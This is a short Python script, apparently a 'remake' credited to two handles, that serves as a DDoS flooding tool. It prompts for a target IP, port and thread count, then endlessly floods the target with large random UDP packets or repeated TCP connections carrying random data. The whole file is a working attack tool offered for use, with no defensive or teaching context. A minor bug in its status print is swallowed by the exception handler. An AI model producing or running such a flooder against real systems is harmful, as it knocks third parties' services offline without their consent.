#!/usr/bin/env python3
#Code by LeeOn123
import random
import socket
import threading

print("""\033[1;31;40m

Remake By : Danzel
Code By : Leon
""")
ip = str(input(" IP:"))
port = int(input(" PORT:"))
choice = str(input(" UDP(y/n):"))
times = int(input(" Packets per one connection:"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(102400)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(+"\033[0;37;40m Ddos Attack To IP %s \033[33mAnd Port%s"%(ip,port))
		except:
			print("\033[0;37;40m Ddos Attack To IP %s And Port %s"%(ip,port))

def run2():
	data = random._urandom(811)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(+"\033[0;37;40m Ddos Attack To IP %s \033[33mAnd Port%s"%(ip,port))
		except:
			s.close()
			print("\033[0;37;40m Ddos Attack To IP %s And Port %s"%(ip,port))

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
